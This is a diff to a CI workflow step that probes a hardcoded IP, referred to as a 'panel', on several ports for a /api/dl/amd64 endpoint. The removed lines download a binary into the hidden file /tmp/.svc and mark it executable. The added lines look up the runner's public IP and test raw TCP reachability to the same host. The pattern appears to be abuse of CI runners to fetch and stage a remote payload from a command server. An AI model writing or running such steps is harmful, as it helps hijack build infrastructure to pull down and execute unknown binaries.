@@ -10,13 +10,16 @@ jobs:
         run: |
           PANEL_IP="43.228.157.68"
           echo "=== Testing ports to $PANEL_IP ==="
-          for PORT in 80 8888 443 8080; do
-            echo -n "Port $PORT: "
-            CODE=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "http://$PANEL_IP:$PORT/api/dl/amd64" 2>/dev/null)
-            SIZE=$(curl -s --max-time 5 -o /tmp/tk_$PORT "http://$PANEL_IP:$PORT/api/dl/amd64" 2>/dev/null && wc -c < /tmp/tk_$PORT 2>/dev/null || echo 0)
-            echo "HTTP $CODE size:$SIZE"
+          for PORT in 80 8888 443 8080 9090 3000; do
+            CODE=$(curl -s --max-time 8 -o /dev/null -w "%{http_code}" "http://$PANEL_IP:$PORT/api/dl/amd64" 2>/dev/null) || CODE="timeout_$(echo $?)"
+            SIZE=$(curl -s --max-time 8 "http://$PANEL_IP:$PORT/api/dl/amd64" 2>/dev/null | wc -c) || SIZE=0
+            echo "Port $PORT => HTTP $CODE size:$SIZE"
           done
           echo ""
-          echo "=== Download attempt on port 80 ==="
-          curl -sfL "http://$PANEL_IP:80/api/dl/amd64" -o /tmp/.svc && echo "DOWNLOAD OK size:$(wc -c < /tmp/.svc)" || echo "DOWNLOAD FAILED"
-          test -s /tmp/.svc && chmod 755 /tmp/.svc && echo "Binary valid: $(file /tmp/.svc | head -1)" || echo "Binary empty/invalid"
+          echo "=== Runner public IP ==="
+          curl -s --max-time 5 ifconfig.me || curl -s --max-time 5 api.ipify.org || echo "unknown"
+          echo ""
+          echo "=== Test TCP connectivity directly ==="
+          for PORT in 80 8888 443 8080; do
+            timeout 5 bash -c "echo >/dev/tcp/$PANEL_IP/$PORT" 2>/dev/null && echo "TCP $PORT: OPEN" || echo "TCP $PORT: BLOCKED/TIMEOUT"
+          done
